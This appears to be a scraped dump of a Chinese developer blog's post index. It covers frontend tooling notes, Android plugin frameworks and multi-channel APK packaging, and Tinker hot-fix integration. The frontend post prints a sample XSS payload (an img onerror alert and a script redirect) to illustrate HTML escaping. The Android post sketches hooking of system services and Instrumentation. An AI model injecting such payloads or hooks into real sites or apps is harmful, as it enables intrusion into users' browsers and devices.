安装好babel-loader之后，在webpack.config.js中添加loader(loaders本来就是一个数组) loaders { { test: /\\.js$/, loader: &#39;babel-loader&#39;, exculde: /node_modules/, //排除所有node_modules下面的文件 query: {preset: [&#39;es2015&#39;]}} //这个正则的意思是所有js后缀的文件 } Third Party Library Vue Relatedbetter-scroll 滴滴的员工写的 handlebars,ejs,jade模板（和python那边的jinja模板一个意思） less,sass,stylus(css预处理器)jQuery RelatedjQuery是一个Dom Manipulate Library Twitter BootStrapBootStrap速查手册 工具vsCode插件推荐 Auto Close tag Beautify HTML CSS supported Live Server Prettier Vetur Vue2 Snippets Bracket Pair Colorizer VSCode快捷键(其实可以自己配置的，vs的设置文件就是一个很大的json)vs code 调整锁进的命令叫做reindent 在不会自己搭服务的情况下只好拿一些免费的api凑合了postscnodejs 使用nginx搭建本地服务器官方说nginx的windows版本只供测试使用，性能不怎么样，但用于前端部署还是够用的。去nginx网站下载windows版本的nginx，解压缩，双击可执行文件nginx.exe。在这之前，最好先打开conf文件夹，编辑nginx.conf。设置一下端口，因为默认的80说不定就给谁占用了。其实用命令行也能启动： start nginxtasklist /fi “imagename eq nginx.exe” //这个是windows下查看当前在运行的nginx的命令nginx -s stop // 立即关闭nginx -s quit // graceful shutdown这些东西官网上都写得很明白。 生产环境部署前端静态资源可以这么设置，参考知乎的回答&gt;用vue-cli搭建的做法:1、npm run build2、把dist里的文件打包上传至服务器 例 /data/www/，我一般把index.html放在static里所以我的文件路径为：/data/www/static|—–index.html|—–js|—–css|—–images ….3、配置nginx监听80端口，location /static alias 到 /data/www/static，重启nginxlocation /static { alias /data/www/static/; }4、浏览器访问http://ip/static/index.html即可 Babel是一个可以把ES6代码打包成ES5代码的插件，毕竟要兼容老的浏览器。ua-parser-js是一个很好用的检测ua的library。Backbone是一个mvc框架移动开发中的一些有用meta标签 [X]如何使用js显示一个Dialog [X]Express js [ ] css3 属性大全 vscode disable eslint，在workspace setting中添加 “jshint.enable” : false atom的emmet插件很好用比如想要创建一个 &lt;div class=&#39;test&#39;&gt;&lt;/div&gt; 只需要输入div.test或者.test然后按tab键好玩的Atom插件minimap,emmet,file icons，atom liveserver,atom beautify =======================================================================================atom中输入vue,会自动提示生成vue模板,输入re会生成react Boilplate。前提是在js,vue,html文件中。 把vscode 加入command line，将’C:\\Program Files (x86)\\Microsoft VS Code\\bin’添加到windows的环境变量中即可。cmd里输入code即可打开当前目录。 handlebars渲染template的过程就是把写在模板里面的大括号包着的变量换成String。所以，在hbs文件里内嵌的js是没有办法轻易拿到data的。这跟flask很像。这里顺便提到iffe的概念Immediately-invoked_function_expression &lt;script src=&quot;http://cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.0.0/handlebars.min.js&quot;&gt;&lt;/script&gt; &lt;script id=&quot;test-template&quot; type=&quot;text/x-handlebars-template&quot;&gt; &lt;label&gt;Label here&lt;/label&gt; {{textField dataAttribs='{\"text\":\"Hello\", \"class\":\"input\"}'}} &lt;/script&gt; Handlebars.registerHelper(&#39;textField&#39;, function(options) { var dom = &#39;&lt;input type=&quot;text&quot;&gt;&#39;, attribs; attribs = JSON.parse(options.hash.dataAttribs); console.log(attribs.text + &quot; -- &quot; + attribs.class); return new Handlebars.SafeString(dom); }); $(function() { var markup = $(&#39;#test-template&#39;).html(); var template = Handlebars.compile(markup); $(&#39;body&#39;).append(template()); }); 来看看xss一般的手段 &lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot; /&gt; 防范XSS攻击的手段中提到了，对于用户的输入，需要有条件的进行转换比如说 &lt; 变成 &amp;lt; &gt; 变成 &amp;gt; &amp; 变成 变成&amp;quot; 就像这样 private static String htmlEncode(char c) { switch(c) { case &#39;&amp;&#39;: return &quot;&amp;amp;&quot;; case &#39;&lt;&#39;: return &quot;&amp;lt;&quot;; case &#39;&gt;&#39;: return &quot;&amp;gt;&quot;; case &#39;&quot;&#39;: return &quot;&amp;quot;&quot;; case &#39; &#39;: return &quot;&amp;nbsp;&quot;; default: return c + &quot;&quot;; } } 经过编码转换之后 &lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt; ## 就变成了 &amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt; python flask里面类似的函数叫做escape. cms(content management system)参考 参考 一个腾讯前端的博客 Webpack Crash Course Use Babel &amp; Webpack To Compile ES2015 - ES2017 rel=”dns-prefetch”","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"从DroidPlugin谈插件化开发","date":"2017-11-22T22:33:44.000Z","path":"2017/11/22/2017-11-22-from-Droid-plugin-onto-more/","text":"关于360团队出开源的DroidPlugin的一些记录 过程中发现了关于插件化，Hook系统方法的操作，摘录下来。 1. 从Context的本质说起其实也简单，就是ContextImpl，一个各种资源的容器。 Activity extends ContextThemeWrapper ContextThemeWrapper extends ContextWrapper ContextWrapper extends Context Activity作为一个天然的交互核心，能够以一个容器的身份（继承而来）轻易获取这些外部资源，也使得基于UI页面的开发变得简单。如果对于ActivityThread有所了解的话，就知道Activity的生命周期都是在这个类中完成的简单来说在ContextImpl中createActivityContext方法中使用new的方式创建了一个ContextImpl，整个流程就是ActivityThread在创建一个Activity后，给它不断赋值的过程。ContextImpl只是一个各种资源的容器（比如Resource,Display,PackageInfo,构造函数里面塞了一些，创建出来之后还给一些变量赋了值）。 Hook(使用Invokcation handler，将一个接口的调用原本的实现包揽下来，把原来的结果占为己有，同时添加一些自己要做的事情)修改getSystemService，添加自定义功能Hook掉AMS,在startActivity里面添加一些私货。getSystemService最终会追溯到SystemServiceRegistry.java。这里面用static block的方式初始化了各种service的cache. 1.1 ActivityThread做了很多事onSaveInstance是从ActivityThread的callCallActivityOnSaveInstanceState方法dispatch下来的。 2. Hook作为插件化的切入点给了开发者篡改系统api实现的通道比如Hook掉剪切板SystemService,比如在ActivityManagerService调用IPC操作时添加私货 3. Android多渠道打包的实现3.1 历史上曾经有效的方式，原始方法关于gradlew打包release之前，先Build -&gt; Generate Singed apk 创建一个新的keystore , 密码记住，keystore文件保存好。关于打包: 根据Android 多渠道打包梳理Gradle UMeng 多渠道打包 Android.manifest文件添加 &lt;meta-data android:name=&quot;UMENG_CHANNEL&quot; android:value=&quot;${UMENG_CHANNEL_VALUE}&quot; /&gt; app的build.gradle中添加android { ... productFlavors { xiaomi { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;xiaomi&quot;] } _360 { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;_360&quot;] } baidu { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;baidu&quot;] } wandoujia { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;wandoujia&quot;] } ... } ... } android { productFlavors { xiaomi {} _360 {} baidu {} wandoujia {} } productFlavors.all { flavor -&gt; flavor.manifestPlaceholders = [UMENG_CHANNEL_VALUE: name] } } 打包除此之外 assemble 还能和 Product Flavor 结合创建新的任务（assemble + Build Variants），Build Variants = Build Type + Product Flavor ./gradlew assembleDebug # 会打包 Debug apk./gradlew assembleRelease # 打包 Release apk./gradlew assembleWandoujiaRelease # 打包 wandoujia Release 版本，大小写不敏感./gradlew assembleWandoujia # 此命令会生成wandoujia渠道的Release和Debug版本 但是，20个渠道就要编译20次，耗时冗长。 3.2 在META-INF目录内添加空文件，可以不用重新签名应用。已失效比较出名的有python版本的，就是写了个空文件 for line in channels: target_channel = line.strip() target_apk = output_dir + apk_names[0] + &quot;-&quot; + target_channel+&quot;-&quot;+apk_names[2] + src_apk_extension shutil.copy(src_apk, target_apk) zipped = zipfile.ZipFile(target_apk, &#39;a&#39;, zipfile.ZIP_DEFLATED) empty_channel_file = &quot;META-INF/uuchannel_{channel}&quot;.format(channel = target_channel) //所以渠道号简单来说就是往META-INF里写了一个&quot;uuchannel_xiaomi&quot;之类的文件 zipped.write(src_empty_file, empty_channel_file) zipped.close() 亲测 关于多渠道打包，由于新的签名机制的引入，上面的这种方法是会报错的。 $ adb install app-release_channel_xiaomi.apkFailed to install app-release_channel_xiaomi.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl185799136.tmp/base.apk: META-INF/CERT.SF indicates /data/app/vmdl185799136.tmp/base.apk is signed using APK Signature Scheme v2, but no such signature was found. Signature stripped?] 美团的技术团队给出了科普， 新的签名方案会在ZIP文件格式的 Central Directory 区块所在文件位置的前面添加一个APK Signing Block区块，下面按照ZIP文件的格式来分析新应用签名方案签名后的APK包。整个APK（ZIP文件格式）会被分为以下四个区块：Contents of ZIP entries（from offset 0 until the start of APK Signing Block）APK Signing BlockZIP Central DirectoryZIP End of Central Directory新应用签名方案的签名信息会被保存在区块2（APK Signing Block）中， 而区块1（Contents of ZIP entries）、区块3（ZIP Central Directory）、区块4（ZIP End of Central Directory）是受保护的，在签名后任何对区块1、3、4的修改都逃不过新的应用签名方案的检查。 3.3 还有就是往apk(zip)文件尾部添加comment End of central directory recordOffset Bytes Description 译0 4 End of central directory signature = 0x06054b50 核心目录结束标记（0x06054b50）4 2 Number of this disk 当前磁盘编号6 2 Disk where central directory starts 核心目录开始位置的磁盘编号8 2 Number of central directory records on this disk 该磁盘上所记录的核心目录数量10 2 Total number of central directory records 该磁盘上所记录的核心目录数量12 4 Size of central directory (bytes) 核心目录的大小16 4 Offset of start of central directory, relative to start of archive 核心目录开始位置相对于archive开始的位移20 2 Comment length (n) 注释长度 (n)22 n Comment 注释内容 apk 默认情况下没有comment，所以 comment length的short 两个字节为 0，我们需要把这个值修改为我们的comment的长度，然后把comment追加到后边即可。Android N 中提到了 APK Signature Scheme v2，这种新引入的签名机制，会对整个文件的每个字节都会做校验，包括 comment 区域。所以到时候如果app使用新版本的签名工具的时候，如果启用 scheme v2，那么这个机制则不能工作。目前看代码，是可以disable v2 的。 虽然目前暂时还是可以disable APK Signature Scheme v2的。 signingConfigs { release { v2SigningEnabled false } } 3.3 当前比较合适的方案是使用美团的walleSignature Scheme v2的出现让目前美团的walle成为公开已知的多渠道打包的最好选择还有一个开源的gradle plugin据说也支持V2签名模式 美团的walle接入指南,原理都在新一代开源Android渠道包生成工具Walle 有人给出了Android多渠道打包的进化史，很有意思 为什么 Android 要采用 Binder 作为 IPC 机制？ 传统的进程间通信方式有管道，消息队列，共享内存等，其中管道，消息队列采用存储-转发方式，即数据先从发送方缓存区拷贝到内核开辟的缓存区中，然后再从内核缓存区拷贝到接收方缓存区，至少有两次拷贝过程。共享内存虽然无需拷贝，但控制复杂，难以使用。socket作为一款通用接口，其传输效率低，开销大，主要用在跨网络的进程间通信和本机上进程间的低速通信。Binder通过内存映射的方式，使数据只需要在内存进行一次读写过程。内存映射，简而言之就是将用户空间的一段内存区域映射到内核空间，映射成功后，用户对这段内存区域的修改可以直接反映到内核空间，相反，内核空间对这段区域的修改也直接反映用户空间。那么对于内核空间&lt;—-&gt;用户空间两者之间需要大量数据传输等操作的话效率是非常高的。 sharedPreference不支持跨进程，建议使用ContentProvider这种 Context.MODE_MULTI_PROCESSThis constant was deprecated in API level 23. MODE_MULTI_PROCESS does not work reliably in some versions of Android, and furthermore does not provide any mechanism for reconciling concurrent modifications across processes. Applications should not attempt to use it. Instead, they should use an explicit cross-process data management approach such as ContentProvider. 听说你Binder机制学的不错，来面试下这几个问题 Client发起IPC请求，是阻塞的吗？这个要看了，反正startActivity和finish这种都不是 adb getEvent sendEventinput tap x yinput touchescreeninput text helloworldinput keyevent Xposed的介绍与入门Xposed的原理与Multidex及动态加载问题 组件化、插件化组件化、插件化的前提就是解耦 在Android中执行shell指令滴滴的virtualApp。 目前看来就是用android.content.pm.PackageParse去解析一个apk文件，封装成一个LoadedPlugin对象（Cache下来），后续调用apk中描述的功能进行操作。所以应该还是在host的进程中跑的。由此联系到PackageInstaller 原理简述 组件化的方案多为路由 + 接口下沉的方式，所有接口下沉到base中，组件中实现接口 多渠道的话这样的命令要跑多次使用walle就好了,在project 的 build.gradle 添加: dependencies { classpath &#39;com.meituan.android.walle:plugin:1.0.3&#39; } app/build.gradle 添加： apply plugin: &#39;walle&#39; dependencies { ... compile &#39;com.meituan.android.walle:library:1.0.3&#39; } 在工程目录下创建 channel 文件： meituan # 美团 samsungapps #三星 hiapk anzhi xiaomi # 小米 91com gfan appchina nduoa 3gcn mumayi 10086com wostore 189store lenovomm hicloud meizu wandou # Google Play # googleplay # 百度 baidu # # 360 360cn # # 应用宝 myapp 编译全部渠道gradlew clean assembleReleaseChannelsgradlew clean assembleReleaseChannels -PchannelList=huawei // 只编译华为的gradlew clean assembleReleaseChannels -PchannelList=huawei,xiaomi // 小米跟华为的 以上亲测通过，原本装的jdk 9，一直报错。在java home里换成jdk 1.8后，就没什么问题了。有问题gradlew的时候后面跟上–stacktrace，出错了粘贴到google里就好了。 在java代码中获取渠道信息 String channel = WalleChannelReader.getChannel(this.getApplicationContext()); 关于美团的热修复方案，亲测可用，生成的patch.jar文件大小5.0kB(改了个方法)美团的热修复叫Robust 按照官方wiki在build.gradle中添加需要的依赖。还有一个robust.xml文件，把packageName和patchPackageName改成自己的，看下别的配置，注释都很清楚 先打release包，记得开progurad。gradlew clean assembleRelease –stacktrace 在activity里面放一个button,在onClick的时候loadPatch.记得PatchManipulateImpl里面写的setPatchesImfoImplClassFullName要和roubust.xml里面写的一样 在activity里面修改的代码添加@mofidy注解，@Add作为新加的方法的注解 开始打补丁包.在gradle中注释掉apply plugin: ‘robust’，开启apply plugin: ‘auto-patch-plugin’。把app/build/outputs/mappings/mapping.txt文件和app/build/outputs/robust/methodsMap.robust这两个文件粘贴到app/robust文件夹中。重新打release包：gradlew clean assembleRelease –stacktrace。报错是正常的。 在app/build/outputs/robust文件夹中找到patch.jar文件。 adb push app/build/outputs/robust/patch.jar /sdcard/robust/patch.jar 进Activity，点击那个loadPath的按钮，就是去刚才adb push的路径去加载这个patch（当然生产环境应该是搭建https服务了）。 插件化开发small解释了动态注册activity的原理:app所在进程startActivity会通过Instrumentation的execStartActivity方法向system_server进程的activityManagerService发起请求，在这里要将插件activity的名称换成之前写在manifest中的名称。system_server完成启动Activity会回调到Instrumentation的newActivity方法，在这里可以将manifest中的名称还原成插件的activity名称。 ActivityThread thread = currentActivityThread(); Instrumentation base = thread.@mInstrumentation; Instrumentation wrapper = new InstrumentationWrapper(base); thread.@mInstrumentation = wrapper; class InstrumentationWrapper extends Instrumentation { public ActivityResult execStartActivity(..., Intent intent, ...) { fakeToStub(intent); //这里在intent里面放个className就好了 base.execStartActivity(args); } @Override public Activity newActivity(ClassLoader cl, String className, Intent intent) { className = restoreToReal(intent, className); //这里从intent中读取className就好了 return base.newActivity(cl, className, intent); } } sharedUid通过Shared User id,拥有同一个User id的多个APK可以配置成运行在同一个进程中.所以默认就是可以互相访问任意数据。 在windows平台上，gradle下载的缓存文件位置在哪里？ 最后引用移动开发的罗曼蒂克消亡史 | InfoQ中的一段话 插件化和热更新技术是真的不可避免的衰落了，它们已经错过了历史机遇期，新的技术已经从另一个维度实施了降维打击，没错，说的就是小程序。 参考分析DroidPlugin，深入理解插件化框架逆向大全Android Hook技术防范漫谈爱奇艺组件化探索之原理篇Atlas容器框架","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"插件化","slug":"插件化","permalink":"https://haldir65.github.io/tags/插件化/"}]},{"title":"集成Tinker的一些记录","date":"2017-11-18T17:25:29.000Z","path":"2017/11/18/2017-11-18-integrating-tinker/","text":"关于Android Application集成Tinker的一次记录。 1. 首先从官方Demo项目开始Tinker是2016年开源的，先直接clone下来。我的环境： Android Studio 3.0 稳定版gradle版本：distributionUrl=https\\://services.gradle.org/distributions/gradle-4.1-all.zipgradle插件版本: classpath ‘com.android.tools.build:gradle:3.0.0’TINKER_VERSION=1.9.1compileSdkVersion 26buildToolsVersion ‘26.0.2’ Android Studio 3.0 因为刚出来，所以遇到了一些问题，不过好在Google一下或者在issue里面查一下，都能找到合适的解答 官方Demo先把官方Demo按照普通App的流程安装上来。这时候在app/build/bakApk/目录下就会出现“app-debug-1118-15-50-07.apk”这样的文件，其实是复制了一份当前的apk 然后，在MainActivity代码中，把原本注释掉的一行Log取消注释，运行如下命令 gradlew tinkerPatchDebug或者在Andriod Studio的Gradle tab里面找到这个task，运行一下 打releasePatch其实也差不多 gradlew tinkerRelease 一切顺利的话，在app/build/outputs/apk/tinkerPatch/debug文件夹下就会看到一些新生成的文件，例如“app/build/outputs/apk/tinkerPatch/debug/patch_signed.apk”，“app/build/outputs/apk/tinkerPatch/debug/patch_signed_7zip.apk”等等，具体每个文件是干嘛的文档上都说了。这时候通过adb push命令把这个7zip文件上传到手机根目录下 adb push ./app/build/outputs/tinkerPatch/debug/patch_signed_7zip.apk /storage/sdcard0/patch_signed_7zip.apk或者在Android Studio 3.0右下角有一个Device File Explorer,把这个文件上传到手机里 上面那个路径不一定准，总之需要和这里面的路径一样，所以我在模拟器里面是sdcard/emulated/0这个目录下 TinkerInstaller.onReceiveUpgradePatch(getApplicationContext(), Environment.getExternalStorageDirectory().getAbsolutePath() + &quot;/patch_signed_7zip.apk&quot;); 上传完毕之后，在当前页面点击Button，点击事件调用到上面这一行代码.一切Ok的话（运气好的话），会出现Toast,其实这个Toast是在SampleResultService（一个IntentService）里面写的，也就是说Patch打上的话，开发者可以自定义一些UI事件。 这时候再Kill Porcess,据说锁屏也行？重新启动后，刚才取消注释的那一行代码就在logcat里面出现了。 到此，在没有重新打包的情况下，热修复完成。 2. 已有的项目改造照着改成这样在Gradle.properties里面添加 TINKER_VERSION = 1.9.1 //只是为了集中管理TINKER_ID = 1.0 //这个不添加会报错 project的build.gradle中添加 classpath “com.tencent.tinker:tinker-patch-gradle-plugin:${TINKER_VERSION}” app的build.gradle中需要新增很多东西，建议直接复制过来。需要改的地方就是 ext { tinkerOldApkPath = &quot;${bakPath}/app-debug-1118-15-50-07.apk&quot; // 找到当前app/build/bakApk/目录下的apk文件，把名字改成自己和当前的文件一样的 } ignoreWarning = true //默认是false，不改经常编译报错 implementation(&quot;com.tencent.tinker:tinker-android-lib:${TINKER_VERSION}&quot;) { changing = true } provided(&quot;com.tencent.tinker:tinker-android-anno:${TINKER_VERSION}&quot;) annotationProcessor(&quot;com.tencent.tinker:tinker-android-anno:${TINKER_VERSION}&quot;) 接下来是Application，如果自己继承了android.app.Application的话，得改一下 //原来 public MyApplication extends Application{ } //现在 @SuppressWarnings(&quot;unused&quot;) @DefaultLifeCycle(application = &quot;com.包名.SomeName&quot;, flags = ShareConstants.TINKER_ENABLE_ALL, loadVerifyFlag = false) public class AppLike extends DefaultApplicationLike { static Context context; public AppLike(Application application, int tinkerFlags, boolean tinkerLoadVerifyFlag, long applicationStartElapsedTime, long applicationStartMillisTime, Intent tinkerResultIntent) { super(application, tinkerFlags, tinkerLoadVerifyFlag, applicationStartElapsedTime, applicationStartMillisTime, tinkerResultIntent); } /** * install multiDex before install tinker * so we don&#39;t need to put the tinker lib classes in the main dex * * @param base */ @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH) @Override public void onBaseContextAttached(Context base) { super.onBaseContextAttached(base); //you must install multiDex whatever tinker is installed! MultiDex.install(base); AppLike.context = getApplication(); //初始化Tinker TinkerInstaller.install(this); } @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH) public void registerActivityLifecycleCallbacks(Application.ActivityLifecycleCallbacks callback) { getApplication().registerActivityLifecycleCallbacks(callback); } public static Context getContext() { return context; } } Mainfest里面要改成上面那个“com.包名.SomeName” 接下来按照之前的步骤就Ok了。 3. Configuration以上只是简单的把Demo跑通，接下里需要看下Tinker提供的定制项 ======================================================================= 4. 常见问题Q: 我只不过改了一个Toast的文案，为毛生成的patch_signed_7zip.apk文件这么大()？A: 看下tinkerPatch文件夹下面的log.txt文件（建议用Notepad打开），里面一大堆“Found add resource: res/drawable-hdpi-v4/abc_list_pressed_holo_light.9.png”这样的类似的出现，具体原因跟aapt有关，好像可以设置detect resource change （大概就这意思）为false，这样就不会那么大了。 Q: Tinker-Patch把补丁文件放在什么位置A: 因为接收补丁的代码就在TinkerInstaller.onReceiveUpgradePatch这一段了。在UpgradePatchRetry.java中，有这么一段：tempPatchFile = new File(SharePatchFileUtil.getPatchTempDirectory(context), TEMP_PATCH_NAME); （/data/data/com.example.myApp/data/tinker_temp/temp.apk）。当然还有其他的，总之就是放在当前应用data文件夹下面的tinker或者tinker_temp文件夹下。 Q: TinkerPatch和Tinker什么关系A：TinkerPatch的SDK里面包含了Tinker必要的功能，开发者只需要添加TinkerPatch这一条依赖，也不需要去继承ApplicationLike这些东西了，开发者不用自己开一个下载服务去下发patch_signed_7zip.apk这个文件了，onReceiveUpgradePatch这些事也做好了。确实是接入成本最低的方案，搭建后台假如交由自己公司的API团队处理，起码得好几天，还得耽误产品正常的开发节奏。而TinkerPatch给出的报价是399元/月。短期来看，显然前者的成本要高出不少，还得顾虑自家团队维护的代价。算一笔经济账的话，显然企业倾向于花钱买稳定服务。对于个人来讲，目前有免费版可以使用，估计也是为了给测试Demo使用的，想玩简单版的话可以试试。 Q: 如何更换Dex的A: 引用Android热补丁之Tinker原理解析中的话：“由于Tinker的方案是基于Multidex实现的修改dexElements的顺序实现的，所以最终还是要修改classLoder中dexPathList中dexElements的顺序。Android中有两种ClassLoader用于加载dex文件，BootClassLoader、PathClassLoader和DexClassLoader都是继承自BaseDexClassLoader。最终在DexPathList的findClass中遍历dexElements，谁在前面用谁。”。所以其实就是根据下发的补丁文件，把dex文件给修改了，这一点跟MultiDex很像。更新一下，低版本是dexpathList前置，高版本则直接创建classLoader Q: Dex文件格式A： The Dex File Format。值得一提的是，这篇文章提到了文件头，dex的头是 6465780A 30333800dex038 这个是hexoDecimal，十六进制2个数字（字母）代表一个byte(2*8bits = 2 bytes)，按照二进制0101的方式来看的话就是： 6465（0110 0100 0110 0101） 780A(0111 1000 0000 1010)。关于dex format的更多的分析 Q: broken.apk + patch_signed_7zip = fixed apk的过程A: 在UpgradePatch.tryPath -&gt; DexDiffPatchInternal.tryRecoverDexFiles -&gt; dexOptimizeDexFiles -&gt; TinkerDexOptimizer.optimizeAll -&gt;OptimizeWorker.run -&gt; DexFile.loadDex(DexFile是dalvik.system包下的)。 这些都是在patch进程运行的 Q： 把Tinker导入Intelij中A： Intelij中open project -&gt; 选择 tinker-build/tinker-build.iml 即可。顺带着其他的mudule都能查看了。最好在tinker-sample-android/app/build.gradle文件中注释掉这两句话 // annotationProcessor(“com.tencent.tinker:tinker-android-anno:${TINKER_VERSION}”) { changing = true }// compileOnly(“com.tencent.tinker:tinker-android-anno:${TINKER_VERSION}”) { changing = true } Q: 关于BSDiffA：windows下可以直接下载对应的exe ,cmd中执行 bsdiff old.apk new.apk old-to-new.patchbspatch old.apk new2.apk old-to-new.patch Q: patch进程是如何和业务进程交互的A： tinker-android/tinker-android-lib/src/main/AndroidManifest.xml中明确指明了打补丁是在一个youpackagename:patch的进程中去操作的。这样做也是为了减少对于主业务的影响。跨进程交互并没有写aidl，其实只是起了一个IntentService通知主业务进程。 Q: 关于CLASS_ISPREVERIFIED这个关键词A：dexElements数组更换之后就完事了？其实还差一个类的校验。这里不是说classLoader的校验（这个好像有五个步骤），这篇文章提到了 Q: 多渠道要不要打多个包啊A: 如果是使用productFlavor这种官方方式打出来的多渠道包，确实需要打多个补丁，这个gradle task的名字叫做buildAllFlavorsTinkerPatchRelease(相当长)bugly团队的解释，因为 public final class BuildConfig { public static final boolean DEBUG = Boolean.parseBoolean(&quot;true&quot;); public static final String APPLICATION_ID = &quot;com.example.application&quot;; public static final String BUILD_TYPE = &quot;debug&quot;; public static final String FLAVOR = &quot;&quot;; public static final int VERSION_CODE = 1; public static final String VERSION_NAME = &quot;1.0&quot;; } 不同的渠道包的BuildConfig这个class文件的flavor这个值就不一样了，所以最后的dex文件都不一样了。所以更好的方式是使用美团的walle(往APK Signature Block这里添加ID-Value),能够这么做的原因仅仅是google目前还没对这块限制，也就是这里可以当做一个自定义的key-value存储block。因为这种方式没有碰dex，所以就可以一个补丁修复所有渠道了（在bakApk文件夹下面不是有基准包嘛） 在apk安装的时候系统会将dex文件优化成odex文件，在优化的过程中会涉及一个预校验的过程如果一个类的static方法，private方法，override方法以及构造函数中引用了其他类，而且这些类都属于同一个dex文件，此时该类就会被打上CLASS_ISPREVERIFIED如果在运行时被打上CLASS_ISPREVERIFIED的类引用了其他dex的类，就会报错所以MainActivity的onCreate()方法中引用另一个dex的类就会出现上文中的问题正常的分包方案会保证相关类被打入同一个dex文件想要使得patch可以被正常加载，就必须保证类不会被打上CLASS_ISPREVERIFIED标记。而要实现这个目的就必须要在分完包后的class中植入对其他dex文件中类的引用。如果A类引用了C类，C类在其他Dex中，那么就可以避免A类被打上标记。只要在static方法，构造方法，private方法，Override方法中直接饮用了其他dex中的类，这个类就不会被打上CLASS_ISPREVERIFIED的标记。要在已经编译完成后的类中植入对其他类的引用，就需要操作字节码，惯用的方案是插桩。常见的工具有javaassist，asm等。 所以QQ空间给出的方案是在所有class的构造函数中添加一行println(C.class)方法，直接引用另一个dex包中的类。这个添加的过程用javaAssist这种操作字节码的方式就可以简单实现 Android热补丁动态修复技术这一系列文章介绍了使用gradle api对编译过程进行hook，实现自动化补丁操作的过程 Q: Tinker是如何使用gradle插件生成dex补丁的?A: 参考鸿洋这篇文章 打补丁的时候执行的是tinkerPatchDebug这个任务，执行这个任务发现依次执行了这些任务 :app:processDebugManifest:app:tinkerProcessDebugManifest（tinker）:app:tinkerProcessDebugResourceId (tinker):app:processDebugResources:app:tinkerProguardConfigTask(tinker):app:transformClassesAndResourcesWithProguard:app:tinkerProcessDebugMultidexKeep (tinker):app:transformClassesWidthMultidexlistForDebug:app:assembleDebug:app:tinkerPatchDebug(tinker) 1.TinkerManifestTask，用于添加TINKER_ID；2.TinkerResourceIdTask，使用aapt的public.xml和ids.xml接管了资源id的生成.首先在打老的apk包的时候会配置一个tinkerApplyResourcePath，对应的是生成的R.txt的路径。接下来比较res文件夹中各种资源，对比生成public.xml3.TinkerProguardConfigTask。因为proguard的存在，两次打出来的代码混淆差异非常大，proguard有一个-applymapping选项，用于限定两次混淆使用同一份混淆规则。还有com.tencent.tinker.loader.**这些是不能混淆的。 TinkerMultidexConfigTask。这里要确保application、com.tencent.tinker.loader.**这些在主dex中 TinkerPatchSchemaTask，生成patch，生成meta-file和version-file，build patch这里就是对两个apk进行了比较：old apk: build/intermediates/outputs/old apk名称/new apk: build/intermediates/outputs/app-debug/dexFile -&gt; dexDecoder.patch 首先将两个dex读取到内存中，如果oldFile不存在，则newFile认为是新增文件，直接copy到输出目录，并记录log。如果存在，则计算两个文件的md5，如果md5不同，则认为dexChanged(hasDexChanged = true)，执行：collectAddedOrDeletedClasses(oldFile, newFile);该方法收集了addClasses和deleteClasses的相关信息。仅将新增的文件copy到了目标目录。发生改变的文件，后面会执行diffDexPairAndFillRelatedInfo，生成的patch文件放到了outputs/tempPatchedDexes文件夹里。patch完了之后还模拟做了一次合并，看下old dex打完patch是不是和新的dex的md5相同。soFile -&gt; soDecoder.patch 完成so文件的比对,新文件的话直接复制，否则比较md5，超过80%则直接copy新文件至目标文件夹,不超过新文件的80%，则copy patch文件至目标文件夹，记录logresFile -&gt; resDecoder.patch 完成res文件的比对 Q: 收到下发的补丁后是如何合成的，合成好了放在哪了A: 首先，合成是在patch进程跑的，关键方法是DexDiffPatchInternal.patchDexExtractViaDexDiff，这里面做了两件是，一个是合成新的dex文件（extractDexDiffInternals），另一个是手动调用DexFile.loadDex去触发dexoat流程(dexOptimizeDexFiles) 文件写到了/data/data/com.example.application/tinker/patch1.1/Dex/classes1.dex //这里这个classes1.dex我不确定，patch1.1是补丁版本号。这里面就是写往一个ZipOutputStream.然后重启，注意这里是主进程咯，开始加载这个写好的文件，在TinkerDexLoader.loadTinkerJar中，也是去/data/data/com.example.application/tinker/patch1.1/Dex/这个文件夹下面找文件，然后加入到一个legalFiles的list中，调用SystemClassLoaderAdder.installDexes（也就是DexPathList那一套） 好的学习资料Tinker学习计划(2)-Tinker的原理一Android 基于gradle插件实现多渠道打包加快apk的构建速度，如何把编译时间从130秒降到17秒fastdexmultiple-apk-generator 5. 源码解析至少我现在看到7个包： com.tencent.tinker:aosp-dexutils:1.91.@jarcom.tencent.tinker:bsdiff-util:1.91.@jarcom.tencent.tinker:tinker-android-anno:1.91.@jarcom.tencent.tinker:tinker-android-lib:1.91.@jarcom.tencent.tinker:tinker-android-loader:1.91.@jarcom.tencent.tinker:tinker-commons:1.91.@jarcom.tencent.tinker:tinker-ziputils:1.91.@jar 分的这么散估计也是希望能够好扩展吧。换dex文件的关键方法在DexPathList.findClass这个方法里面。参考 网上关于源码解析的文章已经很多，就是要考虑的点特别多。 看一下官方Tinker项目中的文件夹，有一个tinker-build，里面有两个python文件，这就很有意思了。再看看tinker-patch-gradle-plugin，里面一大堆groovy文件，所以看懂这个对于gradle插件开发是有好处的。 目前在1.9.1版本里面好像看到了一个tinkerFastCrashProtect，看来也是跟风天猫快速修复启动保护那一套。关于Tinker-Patch这个外包给第三方的服务，纯属好奇就去看了下url到底长什么样。在TinkerClientAPI里面有这么一段，其实跟Tinker本身庞大的架构比起来，已经算不上什么了。 Uri.Builder urlBuilder = Uri.parse(this.host).buildUpon(); // &quot;http://q.tinkerpatch.com&quot; if (clientAPI.debug) { urlBuilder.appendPath(&quot;dev&quot;); } final String url = urlBuilder.appendPath(this.appKey) .appendPath(this.appVersion) .appendQueryParameter(&quot;d&quot;, versionUtils.id()) .appendQueryParameter(&quot;v&quot;, String.valueOf(System.currentTimeMillis())) .build().toString(); 